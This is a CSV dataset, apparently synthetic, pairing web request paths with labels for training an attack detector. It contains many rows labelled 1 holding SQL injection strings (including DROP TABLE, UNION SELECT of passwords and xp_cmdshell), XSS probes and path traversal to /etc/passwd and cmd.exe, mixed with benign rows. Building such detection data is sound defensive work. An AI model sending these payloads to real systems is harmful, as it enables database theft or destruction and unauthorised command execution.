payload,label
/admin' --,1
/login?id=1828,0
/api/users?sort=asc721,0
/dashboard?category=tech570,0
/products/item,0
/contact?user=urmit303,0
/index.html?sort=asc903,0
/dashboard?sort=asc167,0
/index.html?page=2694,0
/index.html?sort=asc108,0
/index.html?id=1623,0
/api/users,0
/products/item,0
/api/users,0
/about?user=urmit680,0
/about,0
/login?sort=asc916,0
/checkout,0
/about?sort=asc928,0
/contact?search=?id=1; DROP TABLE users,1
/login?page=2679,0
/<script>alert(document.cookie)</script>,1
/login?user=urmit761,0
/checkout?category=tech968,0
/index.html?search=?id=1; DROP TABLE users,1
/dashboard?user=urmit447,0
/contact?category=tech437,0
/checkout,0
/contact?page=2397,0
/index.html?page=2845,0
/index.html?page=2891,0
/api/users?user=urmit234,0
/index.html?category=tech711,0
/login?sort=asc83,0
/dashboard?id=1393,0
/' OR '1'='1,1
/index.html?page=2582,0
/api/users?page=2354,0
/index.html?category=tech518,0
/dashboard?category=tech618,0
/login?page=2792,0
/contact,0
/about?id=1838,0
/index.html?sort=asc108,0
/checkout?sort=asc552,0
/login?sort=asc498,0
/api/users,0
/?id=1; DROP TABLE users,1
/checkout?category=tech662,0
/dashboard?user=urmit630,0
/api/users?sort=asc899,0
/login,0
/api/users?sort=asc911,0
/checkout?category=tech979,0
/about?category=tech157,0
/login?category=tech840,0
"/"" OR 1=1 --",1
/dashboard?sort=asc444,0
/../../../../etc/passwd,1
/contact?category=tech915,0
/products/item,0
/dashboard?search=?id=1; DROP TABLE users,1
/contact?user=urmit790,0
/about,0
/login?category=tech58,0
/products/item?page=2542,0
/contact?user=urmit653,0
/dashboard,0
/../../../windows/system32/cmd.exe,1
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?user=urmit322,0
/api/users?id=1373,0
/index.html?id=1195,0
/dashboard?sort=asc538,0
/login?sort=asc213,0
/login?id=1530,0
/products/item?user=urmit892,0
/onload=prompt(1),1
/api/users?user=urmit247,0
/login?id=1117,0
/about?id=1729,0
/contact?user=urmit87,0
/dashboard?sort=asc114,0
/checkout?id=1237,0
/dashboard,0
"/UNION SELECT username, password FROM users",1
/login?sort=asc780,0
/products/item?sort=asc528,0
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/api/users,0
"/dashboard?search=UNION SELECT username, password FROM users",1
/index.html,0
/login?page=2358,0
/contact?id=1851,0
/checkout?category=tech164,0
/login?user=urmit174,0
/login?sort=asc494,0
/about?sort=asc490,0
/checkout?user=urmit829,0
/products/item?user=urmit330,0
/about?category=tech565,0
/index.html?user=urmit988,0
/api/users?search=onload=prompt(1),1
/about?id=1179,0
/login?search=../../../../etc/passwd,1
/contact?category=tech836,0
/index.html?id=1451,0
/contact?sort=asc512,0
/products/item?id=1374,0
/products/item?sort=asc401,0
/login?user=urmit284,0
/api/users?sort=asc725,0
/login,0
/about?id=128,0
/contact?page=2981,0
/?id=1; DROP TABLE users,1
/checkout,0
/about?user=urmit729,0
/about?user=urmit824,0
/../../../../etc/passwd,1
/checkout?user=urmit736,0
/<script>alert(document.cookie)</script>,1
/checkout?search=onload=prompt(1),1
/contact?page=2281,0
/index.html,0
/onload=prompt(1),1
/login?id=1784,0
/login?id=1838,0
/products/item?user=urmit202,0
/dashboard?user=urmit484,0
/checkout?id=1666,0
/?id=1; DROP TABLE users,1
/login?sort=asc891,0
/checkout?id=1102,0
/api/users?sort=asc978,0
/index.html?sort=asc429,0
/products/item?sort=asc193,0
"/UNION SELECT username, password FROM users",1
/dashboard,0
/contact?sort=asc889,0
/login?user=urmit150,0
/index.html?sort=asc733,0
/index.html?category=tech443,0
/index.html?page=2356,0
/login?category=tech84,0
/products/item?id=157,0
/contact?user=urmit68,0
/login?user=urmit209,0
/'; EXEC xp_cmdshell('dir');--,1
/login?category=tech206,0
/index.html?user=urmit336,0
/contact?id=1717,0
/index.html?sort=asc606,0
/index.html?user=urmit44,0
/checkout?search=onload=prompt(1),1
/contact,0
/api/users?id=1751,0
/login?page=2951,0
/contact,0
/login?id=1456,0
/checkout?category=tech874,0
/index.html?user=urmit657,0
/index.html?user=urmit144,0
/dashboard?search=javascript:eval('var a=1'),1
/products/item?id=1906,0
/login,0
/index.html?id=1477,0
/api/users?page=2962,0
/../../../../etc/passwd,1
/checkout?category=tech535,0
/about?page=2392,0
/login?user=urmit362,0
/about?page=2410,0
/index.html?sort=asc755,0
/index.html?user=urmit751,0
/login?user=urmit192,0
/?id=1; DROP TABLE users,1
/../../../windows/system32/cmd.exe,1
/about?sort=asc584,0
/checkout?user=urmit195,0
/index.html?id=1343,0
/api/users,0
/contact?category=tech54,0
/dashboard?user=urmit332,0
/dashboard?sort=asc874,0
/api/users?sort=asc789,0
/../../../../etc/passwd,1
"/UNION SELECT username, password FROM users",1
/login?category=tech172,0
/contact?sort=asc251,0
/about?page=2285,0
/dashboard?user=urmit142,0
/api/users?category=tech981,0
/login,0
/about?sort=asc522,0
/index.html?category=tech418,0
/login?id=1709,0
/contact?id=1934,0
/products/item?sort=asc887,0
/login?sort=asc911,0
/dashboard?user=urmit752,0
/../../../windows/system32/cmd.exe,1
/dashboard?sort=asc565,0
/products/item?category=tech235,0
/products/item?user=urmit135,0
/index.html?category=tech942,0
/contact?category=tech818,0
/api/users?search=' OR '1'='1,1
/dashboard?sort=asc908,0
/dashboard?user=urmit811,0
/index.html?id=1971,0
/about,0
/login?page=2592,0
/contact?id=1996,0
/index.html?sort=asc126,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?sort=asc943,0
/index.html?user=urmit341,0
/products/item?id=1823,0
/about?search=admin' --,1
/about?id=1494,0
/api/users?page=2402,0
/products/item?sort=asc381,0
/contact?id=1216,0
/admin' --,1
/index.html?user=urmit255,0
/javascript:eval('var a=1'),1
/login?page=2523,0
/index.html?id=1158,0
/dashboard?id=1927,0
/dashboard?page=2370,0
/dashboard?user=urmit358,0
/dashboard?page=2567,0
/checkout?id=1914,0
/'; EXEC xp_cmdshell('dir');--,1
/about?category=tech504,0
/checkout?sort=asc93,0
/about?id=1247,0
/products/item?sort=asc320,0
/dashboard?category=tech692,0
/products/item?category=tech986,0
/dashboard?id=1517,0
/checkout?sort=asc222,0
/contact?id=1576,0
/api/users?page=2927,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/products/item?search=../../../../etc/passwd,1
/index.html,0
/?id=1; DROP TABLE users,1
/login?user=urmit865,0
/contact?page=2329,0
/products/item?id=162,0
/products/item?search=../../../windows/system32/cmd.exe,1
/admin' --,1
/index.html?category=tech399,0
/api/users?page=2299,0
/login?page=2578,0
/index.html?page=2325,0
/login,0
/<script>alert(document.cookie)</script>,1
/checkout,0
/<script>alert(document.cookie)</script>,1
/contact?id=1471,0
/api/users,0
/login,0
/api/users?user=urmit110,0
/api/users?category=tech367,0
/api/users?category=tech198,0
/contact?user=urmit65,0
/login?page=2952,0
/dashboard?id=122,0
/dashboard,0
/api/users?category=tech656,0
/index.html?sort=asc432,0
/login?id=1646,0
/login?sort=asc215,0
/contact?sort=asc329,0
/login?search=../../../windows/system32/cmd.exe,1
/javascript:eval('var a=1'),1
/admin' --,1
/javascript:eval('var a=1'),1
/index.html?search='; EXEC xp_cmdshell('dir');--,1
"/contact?search=UNION SELECT username, password FROM users",1
/login?page=2337,0
/dashboard?page=2986,0
/api/users?category=tech53,0
/about?category=tech215,0
/index.html?id=1347,0
/dashboard?page=2803,0
/admin' --,1
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?user=urmit280,0
/login?search=' OR '1'='1,1
/products/item?page=2838,0
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?user=urmit102,0
/api/users?user=urmit247,0
/about?page=22,0
/about?page=2685,0
/index.html?sort=asc757,0
/dashboard?search=onload=prompt(1),1
"/products/item?search="" OR 1=1 --",1
/products/item?category=tech285,0
/index.html?category=tech159,0
/contact?sort=asc597,0
/api/users?id=1767,0
/dashboard?id=1458,0
/api/users?id=123,0
/index.html?category=tech907,0
/products/item?page=2829,0
/login?sort=asc886,0
/api/users,0
/products/item?sort=asc741,0
/contact,0
/contact?page=2233,0
/login,0
/checkout,0
/products/item?category=tech929,0
/about?user=urmit149,0
/checkout?page=2553,0
/index.html?sort=asc378,0
/<script>alert(document.cookie)</script>,1
/about?category=tech640,0
/' OR '1'='1,1
/login?id=1642,0
/index.html?sort=asc587,0
/login?search=admin' --,1
/login?page=2368,0
/login?search=onload=prompt(1),1
/dashboard,0
/products/item?id=1267,0
/index.html?category=tech707,0
/login?page=2166,0
/products/item,0
/login?user=urmit632,0
/products/item?sort=asc127,0
/contact?id=1298,0
/products/item,0
/login?id=1548,0
/products/item?search=?id=1; DROP TABLE users,1
/dashboard?user=urmit326,0
/contact?sort=asc277,0
/login?sort=asc492,0
/' OR '1'='1,1
/products/item?id=1141,0
/index.html?sort=asc251,0
/about?user=urmit47,0
/contact,0
/<script>alert(document.cookie)</script>,1
/products/item?id=1184,0
/about,0
/products/item?search=?id=1; DROP TABLE users,1
/checkout?user=urmit183,0
/contact?user=urmit954,0
/contact?category=tech673,0
/about?user=urmit819,0
/login?page=2297,0
/about?id=1910,0
/api/users?category=tech993,0
/about?id=1179,0
/api/users?category=tech563,0
/products/item,0
/dashboard?sort=asc740,0
/index.html?id=1504,0
/dashboard?user=urmit532,0
/products/item?user=urmit831,0
/contact?user=urmit590,0
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech751,0
/dashboard?page=2200,0
/about,0
/products/item?user=urmit498,0
/products/item?id=1391,0
/index.html?sort=asc164,0
/index.html?category=tech598,0
/dashboard?sort=asc811,0
/index.html?sort=asc305,0
/checkout?id=1790,0
/about?page=2592,0
/login,0
/dashboard,0
/contact?page=239,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?page=2364,0
/index.html,0
/contact?search=javascript:eval('var a=1'),1
/login?category=tech619,0
/checkout,0
/checkout,0
/api/users?category=tech542,0
/contact?user=urmit197,0
/about?sort=asc32,0
/dashboard?page=2293,0
/about?sort=asc655,0
/login?page=2966,0
/products/item?category=tech529,0
/about?category=tech925,0
/about,0
/login?user=urmit881,0
/contact?page=2549,0
/login,0
/about?sort=asc123,0
/api/users?page=2139,0
/index.html?page=276,0
/contact?page=2445,0
/login?category=tech946,0
/checkout?id=1944,0
/index.html?user=urmit253,0
/api/users?sort=asc686,0
/login?user=urmit619,0
/about?page=2549,0
/checkout?id=1979,0
/dashboard?page=2769,0
/about?category=tech332,0
/contact,0
/contact?user=urmit152,0
/api/users,0
/checkout?id=1332,0
/checkout?user=urmit666,0
/checkout?user=urmit379,0
/checkout,0
/login?search=../../../windows/system32/cmd.exe,1
/'; EXEC xp_cmdshell('dir');--,1
/login?id=1462,0
"/index.html?search=UNION SELECT username, password FROM users",1
/dashboard,0
/contact?category=tech765,0
/api/users?category=tech517,0
/products/item?page=2162,0
/about,0
/admin' --,1
/../../../../etc/passwd,1
/onload=prompt(1),1
/products/item?user=urmit194,0
/about?sort=asc713,0
/index.html?id=1440,0
/dashboard?user=urmit591,0
/api/users?page=2957,0
/about,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?page=2556,0
"/UNION SELECT username, password FROM users",1
/dashboard?user=urmit840,0
/products/item?id=1194,0
/api/users?user=urmit316,0
/about?category=tech503,0
/dashboard?sort=asc834,0
/api/users,0
/api/users?user=urmit966,0
/about?search=../../../windows/system32/cmd.exe,1
/products/item?id=1251,0
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?user=urmit845,0
/dashboard?sort=asc499,0
/index.html?category=tech14,0
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?sort=asc688,0
/dashboard?sort=asc269,0
/checkout?user=urmit312,0
/checkout?sort=asc800,0
/contact?page=2901,0
/login?id=1473,0
/dashboard,0
/contact?page=2193,0
/about,0
/checkout,0
/contact?sort=asc686,0
/api/users?category=tech295,0
/<script>alert(document.cookie)</script>,1
/dashboard?category=tech925,0
/<script>alert(document.cookie)</script>,1
/about?id=195,0
/products/item,0
"/api/users?search="" OR 1=1 --",1
/about?sort=asc340,0
/login?id=1486,0
/contact,0
/contact?search=javascript:eval('var a=1'),1
/../../../windows/system32/cmd.exe,1
/checkout,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech165,0
/api/users,0
/checkout?category=tech591,0
/about?category=tech496,0
/index.html,0
"/login?search="" OR 1=1 --",1
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/contact?search=onload=prompt(1),1
/index.html?user=urmit282,0
/index.html?category=tech964,0
/checkout?user=urmit519,0
/contact?search=javascript:eval('var a=1'),1
/index.html?sort=asc156,0
/index.html?user=urmit331,0
/login,0
/dashboard?id=1189,0
/contact?sort=asc379,0
"/products/item?search="" OR 1=1 --",1
/contact?search=../../../windows/system32/cmd.exe,1
/about?sort=asc423,0
/about?page=2577,0
/checkout?category=tech964,0
/index.html?page=2300,0
/api/users?id=1953,0
/products/item?user=urmit857,0
/contact?sort=asc771,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?sort=asc850,0
/products/item?category=tech642,0
/../../../../etc/passwd,1
/dashboard?id=1639,0
/' OR '1'='1,1
/contact?user=urmit123,0
/login?search=admin' --,1
/login?category=tech668,0
/index.html,0
/index.html?id=1978,0
/dashboard?page=2558,0
/javascript:eval('var a=1'),1
/'; EXEC xp_cmdshell('dir');--,1
/dashboard?page=2694,0
/contact?category=tech871,0
/javascript:eval('var a=1'),1
/login?category=tech332,0
"/"" OR 1=1 --",1
/products/item?search=onload=prompt(1),1
/about?category=tech405,0
/checkout?user=urmit272,0
"/products/item?search=UNION SELECT username, password FROM users",1
/index.html,0
/contact?sort=asc78,0
/products/item?category=tech275,0
/index.html?user=urmit100,0
/index.html?id=1733,0
/index.html?sort=asc119,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/checkout?page=2653,0
/products/item?id=1746,0
/checkout?search=?id=1; DROP TABLE users,1
/api/users?sort=asc517,0
/login?sort=asc558,0
/about?sort=asc227,0
/about?category=tech119,0
/admin' --,1
/api/users?sort=asc916,0
/api/users?user=urmit439,0
/login?page=2453,0
/index.html?sort=asc558,0
/checkout,0
/api/users?category=tech261,0
/dashboard?search=../../../../etc/passwd,1
/login?id=1531,0
/index.html?user=urmit955,0
/contact?id=1676,0
/checkout,0
/about?sort=asc718,0
/api/users?id=113,0
/checkout,0
/about?user=urmit985,0
/about?user=urmit953,0
/checkout?category=tech791,0
/login?id=197,0
/dashboard?page=2400,0
/index.html?sort=asc363,0
/index.html,0
/products/item?page=2698,0
/api/users?page=2466,0
/products/item?sort=asc183,0
/about?sort=asc681,0
/contact?search=<script>alert(document.cookie)</script>,1
/products/item?user=urmit989,0
/about?sort=asc141,0
/products/item?page=2735,0
/checkout?sort=asc544,0
/dashboard?search=?id=1; DROP TABLE users,1
/dashboard?user=urmit531,0
/login,0
/login,0
/about?sort=asc918,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?sort=asc732,0
/products/item?user=urmit74,0
/checkout?id=1306,0
/about?user=urmit573,0
/contact?page=2472,0
/products/item,0
/login,0
/dashboard?page=2613,0
/login?search=../../../windows/system32/cmd.exe,1
/about?page=2544,0
/dashboard?sort=asc833,0
/index.html?id=1595,0
/products/item?id=1556,0
/about?id=1956,0
/api/users?page=2501,0
/about,0
/about,0
/index.html?user=urmit58,0
/about?id=1583,0
/login?category=tech954,0
/about,0
/products/item?sort=asc226,0
/about?search=javascript:eval('var a=1'),1
/contact?search='; EXEC xp_cmdshell('dir');--,1
/index.html?page=2841,0
/api/users?category=tech355,0
/products/item?id=171,0
/products/item?sort=asc385,0
/admin' --,1
/products/item?id=1252,0
/login?page=2101,0
/api/users?sort=asc458,0
/about?search='; EXEC xp_cmdshell('dir');--,1
/checkout,0
/index.html?id=1530,0
/index.html?sort=asc603,0
/login?category=tech687,0
"/index.html?search=UNION SELECT username, password FROM users",1
/contact?sort=asc132,0
/products/item?user=urmit835,0
/index.html,0
/products/item?user=urmit93,0
/products/item?id=1861,0
/admin' --,1
/index.html?category=tech706,0
/index.html?id=1597,0
/?id=1; DROP TABLE users,1
/products/item,0
/api/users?sort=asc869,0
/login?id=1909,0
/dashboard?sort=asc806,0
/checkout,0
/index.html?page=2989,0
/about?search=../../../windows/system32/cmd.exe,1
/'; EXEC xp_cmdshell('dir');--,1
/contact?sort=asc682,0
/about?category=tech936,0
/index.html?page=2470,0
/checkout?user=urmit397,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?id=1882,0
/index.html?category=tech306,0
/login?sort=asc508,0
/dashboard?user=urmit20,0
/api/users?id=1319,0
/index.html?user=urmit561,0
/contact,0
/index.html?sort=asc671,0
/login?category=tech702,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?search=../../../windows/system32/cmd.exe,1
/contact?sort=asc656,0
/dashboard?search=?id=1; DROP TABLE users,1
/products/item?sort=asc129,0
/contact?category=tech623,0
/../../../windows/system32/cmd.exe,1
/api/users?category=tech358,0
/login?user=urmit790,0
/contact?search=onload=prompt(1),1
/api/users?search=<script>alert(document.cookie)</script>,1
/api/users?sort=asc465,0
/about?page=2335,0
/checkout?user=urmit80,0
/products/item?sort=asc27,0
/login?sort=asc955,0
"/checkout?search=UNION SELECT username, password FROM users",1
/about?category=tech627,0
/products/item?sort=asc411,0
/index.html?page=2173,0
/' OR '1'='1,1
/login?page=2817,0
/api/users?id=1326,0
/login,0
/products/item?id=1201,0
/products/item?id=1324,0
/contact?page=2834,0
/login?id=1882,0
/login?id=1862,0
/dashboard?id=1583,0
/login?page=2535,0
/api/users,0
/about,0
/about?category=tech960,0
/api/users?page=2412,0
/contact,0
/dashboard?sort=asc738,0
/checkout?user=urmit488,0
/dashboard?sort=asc883,0
/api/users?user=urmit140,0
/about?id=1343,0
/contact?user=urmit517,0
/index.html?user=urmit419,0
/about?search=admin' --,1
/../../../windows/system32/cmd.exe,1
/checkout?sort=asc264,0
/dashboard?page=2188,0
/dashboard?category=tech218,0
/contact?id=1433,0
/login?search=onload=prompt(1),1
/admin' --,1
/index.html?id=1222,0
/index.html?id=1161,0
/dashboard?id=1457,0
/about,0
/?id=1; DROP TABLE users,1
/about?id=184,0
/contact?page=2444,0
/about?user=urmit383,0
/<script>alert(document.cookie)</script>,1
/products/item?page=2156,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?search=javascript:eval('var a=1'),1
/login?category=tech386,0
/api/users?page=2594,0
/contact?category=tech868,0
/products/item?id=1321,0
/dashboard?search=admin' --,1
/../../../../etc/passwd,1
/index.html?category=tech806,0
/products/item?category=tech680,0
/dashboard?search=javascript:eval('var a=1'),1
/checkout?page=2279,0
/api/users,0
/about?category=tech543,0
/<script>alert(document.cookie)</script>,1
/dashboard?page=2940,0
/api/users?sort=asc640,0
/../../../../etc/passwd,1
/contact?category=tech676,0
/dashboard?page=2517,0
/index.html?search=../../../../etc/passwd,1
/login?id=1976,0
/api/users?sort=asc92,0
/products/item?category=tech678,0
/login?search=../../../windows/system32/cmd.exe,1
/checkout?sort=asc288,0
/checkout?id=1873,0
/api/users?id=1577,0
/login?id=1387,0
/login?page=26,0
/checkout,0
/about?sort=asc259,0
/<script>alert(document.cookie)</script>,1
/login?category=tech398,0
/products/item?page=2460,0
/index.html,0
/api/users?category=tech357,0
/api/users?user=urmit684,0
/login?sort=asc764,0
/dashboard?id=1333,0
/contact?page=289,0
/products/item?id=136,0
/products/item?id=1917,0
/contact?user=urmit828,0
/products/item?page=2432,0
/contact?sort=asc853,0
/api/users?page=2269,0
/login?sort=asc244,0
"/products/item?search=UNION SELECT username, password FROM users",1
/products/item?user=urmit615,0
/contact?sort=asc374,0
/index.html?category=tech369,0
/checkout?category=tech682,0
/contact?id=1401,0
/../../../windows/system32/cmd.exe,1
/index.html?user=urmit788,0
/products/item?search=../../../../etc/passwd,1
/index.html?search=<script>alert(document.cookie)</script>,1
/checkout?sort=asc468,0
/api/users?category=tech191,0
/contact,0
/index.html?sort=asc964,0
/checkout,0
/contact?page=2249,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?category=tech67,0
/api/users?category=tech465,0
/checkout?page=2316,0
/contact,0
/<script>alert(document.cookie)</script>,1
/api/users?id=1321,0
/about?page=2318,0
/products/item?user=urmit829,0
/'; EXEC xp_cmdshell('dir');--,1
/checkout?category=tech173,0
/contact?id=132,0
/index.html?category=tech939,0
/about?sort=asc548,0
/api/users,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?page=2195,0
/index.html,0
/index.html,0
/index.html?search=../../../../etc/passwd,1
/api/users?user=urmit331,0
/login,0
/checkout,0
/dashboard?user=urmit902,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
"/"" OR 1=1 --",1
/products/item?id=1925,0
/login?id=1605,0
/login,0
/about,0
/api/users?sort=asc623,0
/javascript:eval('var a=1'),1
/checkout?category=tech388,0
/login?id=1587,0
/dashboard?category=tech237,0
/about?page=2639,0
/javascript:eval('var a=1'),1
/admin' --,1
/index.html?page=2591,0
/api/users?page=2643,0
/dashboard?id=1811,0
/about?user=urmit753,0
/contact?search=../../../windows/system32/cmd.exe,1
/products/item?user=urmit119,0
/index.html?id=1354,0
/products/item?user=urmit999,0
/products/item?id=1486,0
/api/users?user=urmit17,0
/dashboard?user=urmit321,0
/about?id=1250,0
/checkout?category=tech979,0
/index.html,0
/checkout?category=tech567,0
/index.html?category=tech576,0
/contact?user=urmit902,0
/checkout,0
/<script>alert(document.cookie)</script>,1
/../../../../etc/passwd,1
/api/users?search=?id=1; DROP TABLE users,1
/api/users?id=192,0
"/api/users?search="" OR 1=1 --",1
/api/users?sort=asc728,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?page=2184,0
/contact?user=urmit735,0
/api/users?page=2248,0
/admin' --,1
/admin' --,1
/contact?category=tech94,0
/javascript:eval('var a=1'),1
/index.html?search=' OR '1'='1,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?user=urmit661,0
/dashboard?id=1757,0
"/index.html?search="" OR 1=1 --",1
/checkout?category=tech305,0
/checkout?search=admin' --,1
/dashboard?page=2372,0
/index.html?user=urmit534,0
/index.html?sort=asc419,0
"/index.html?search=UNION SELECT username, password FROM users",1
/dashboard,0
/contact?user=urmit856,0
/about?category=tech38,0
/index.html?id=1367,0
/products/item?sort=asc931,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech741,0
"/contact?search=UNION SELECT username, password FROM users",1
/api/users?search=javascript:eval('var a=1'),1
/index.html?id=1471,0
/login?id=1599,0
/login?category=tech196,0
/checkout?category=tech258,0
/contact?category=tech763,0
/api/users,0
/about?sort=asc295,0
/about?category=tech954,0
/about,0
/contact?page=218,0
/contact?user=urmit672,0
/login?id=1577,0
/dashboard?user=urmit18,0
/index.html,0
"/"" OR 1=1 --",1
/products/item?category=tech646,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout,0
/javascript:eval('var a=1'),1
/about?category=tech552,0
/about?id=1907,0
/index.html,0
/index.html?id=1646,0
/contact?id=1401,0
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?category=tech642,0
/index.html,0
/about?page=2209,0
/index.html?sort=asc195,0
/checkout?sort=asc619,0
/products/item?category=tech922,0
/index.html?page=217,0
/api/users?search=onload=prompt(1),1
/login?category=tech403,0
"/api/users?search=UNION SELECT username, password FROM users",1
/login?search=' OR '1'='1,1
/products/item?id=1837,0
/products/item,0
"/"" OR 1=1 --",1
/products/item?search=onload=prompt(1),1
/admin' --,1
/../../../windows/system32/cmd.exe,1
/index.html?category=tech86,0
/dashboard?category=tech876,0
/about?category=tech305,0
/checkout?page=2186,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?category=tech135,0
/login?id=1495,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact,0
/checkout?category=tech601,0
/about,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?category=tech808,0
/contact?id=1299,0
/login?category=tech669,0
/products/item?id=1664,0
/api/users,0
/login,0
/contact?category=tech179,0
/<script>alert(document.cookie)</script>,1
/checkout,0
/contact?user=urmit111,0
/api/users?page=2391,0
/login?id=1335,0
/login?user=urmit710,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item,0
/about?page=2283,0
/login?id=1489,0
/dashboard?id=1195,0
/about?user=urmit646,0
/checkout?user=urmit454,0
/contact?user=urmit37,0
/checkout?user=urmit442,0
/api/users?id=1969,0
/dashboard?category=tech649,0
/api/users?id=1621,0
/dashboard?id=184,0
/dashboard?id=1867,0
/admin' --,1
/products/item?page=2736,0
/index.html?id=1292,0
/index.html?id=1607,0
/login?page=2604,0
/login?page=2249,0
/products/item,0
/../../../windows/system32/cmd.exe,1
/checkout?category=tech911,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?user=urmit822,0
/dashboard?id=1525,0
"/contact?search="" OR 1=1 --",1
/login?category=tech737,0
/about?user=urmit218,0
/products/item,0
/api/users,0
/'; EXEC xp_cmdshell('dir');--,1
/dashboard,0
"/dashboard?search="" OR 1=1 --",1
/about?page=2759,0
/about?page=2543,0
/?id=1; DROP TABLE users,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?id=154,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/checkout?user=urmit859,0
/login?category=tech427,0
/about?page=2342,0
/login?id=1963,0
/../../../windows/system32/cmd.exe,1
/dashboard?page=2786,0
/login?page=2660,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/contact?page=2333,0
/products/item,0
/<script>alert(document.cookie)</script>,1
/index.html?category=tech666,0
/index.html?user=urmit427,0
/javascript:eval('var a=1'),1
/login?page=2617,0
/api/users?page=2664,0
/../../../windows/system32/cmd.exe,1
/dashboard?category=tech564,0
"/UNION SELECT username, password FROM users",1
/index.html?id=1622,0
/checkout?sort=asc709,0
/login?id=1194,0
/products/item?search=../../../windows/system32/cmd.exe,1
/products/item?category=tech191,0
/about?category=tech135,0
/contact?user=urmit608,0
/checkout?category=tech108,0
/index.html?category=tech219,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?sort=asc808,0
/products/item,0
/index.html?user=urmit696,0
/checkout?category=tech665,0
/about?id=1977,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item,0
/products/item?page=2544,0
/products/item?sort=asc957,0
/dashboard?page=2155,0
/login?page=2789,0
/api/users?sort=asc881,0
/checkout?page=2454,0
/about?sort=asc810,0
/api/users?category=tech589,0
/checkout,0
/checkout?id=1389,0
/api/users?user=urmit409,0
/index.html?id=1236,0
/' OR '1'='1,1
/index.html?sort=asc189,0
/about?user=urmit548,0
/admin' --,1
/api/users?id=1214,0
/checkout?id=1790,0
/about?user=urmit765,0
/checkout?category=tech921,0
/products/item,0
/dashboard?sort=asc861,0
/checkout?user=urmit438,0
/login?user=urmit682,0
/api/users?user=urmit831,0
/index.html?category=tech23,0
/?id=1; DROP TABLE users,1
/login?category=tech395,0
/../../../../etc/passwd,1
/login?id=1361,0
/about?search=admin' --,1
/login,0
/products/item?search=' OR '1'='1,1
/checkout,0
/contact?page=2144,0
/dashboard?page=2970,0
/dashboard?id=1979,0
/contact?category=tech592,0
/contact?user=urmit813,0
/login?category=tech35,0
/products/item?sort=asc649,0
/checkout?id=1394,0
/checkout,0
/index.html?user=urmit793,0
"/UNION SELECT username, password FROM users",1
/api/users?id=1969,0
/login?category=tech237,0
/login?user=urmit736,0
/products/item?sort=asc594,0
/index.html?category=tech835,0
/admin' --,1
/contact?sort=asc775,0
/login?sort=asc961,0
/contact?id=1112,0
/<script>alert(document.cookie)</script>,1
/index.html?user=urmit494,0
/contact?page=2815,0
/contact?page=2794,0
/contact?sort=asc531,0
/index.html?user=urmit468,0
"/contact?search="" OR 1=1 --",1
/api/users?id=1695,0
/api/users,0
/dashboard?id=153,0
/contact?category=tech712,0
/index.html?id=174,0
/contact?page=2780,0
/about?user=urmit282,0
/login?user=urmit519,0
/index.html?search=../../../windows/system32/cmd.exe,1
/about?user=urmit869,0
/about?user=urmit495,0
/api/users?user=urmit976,0
/products/item?id=1290,0
/products/item?category=tech922,0
/about?category=tech895,0
/index.html?sort=asc548,0
/dashboard?page=2445,0
/dashboard?user=urmit683,0
/products/item?category=tech522,0
/api/users?sort=asc542,0
/checkout?category=tech814,0
/login,0
/dashboard?sort=asc975,0
/products/item?search=javascript:eval('var a=1'),1
/dashboard?page=2419,0
/contact?user=urmit224,0
/about,0
/onload=prompt(1),1
/about?category=tech786,0
/about?search=../../../windows/system32/cmd.exe,1
/contact?user=urmit175,0
/index.html?user=urmit694,0
/login?user=urmit704,0
/login?category=tech43,0
/login,0
/about?category=tech852,0
/products/item?id=1575,0
/dashboard,0
/products/item?category=tech563,0
/index.html?category=tech606,0
/products/item?search=../../../windows/system32/cmd.exe,1
/checkout?page=2817,0
/dashboard?sort=asc499,0
/login?search=../../../windows/system32/cmd.exe,1
/products/item?page=2320,0
/api/users?page=266,0
/dashboard?category=tech264,0
"/UNION SELECT username, password FROM users",1
/about?search=javascript:eval('var a=1'),1
/dashboard?search=../../../windows/system32/cmd.exe,1
/login,0
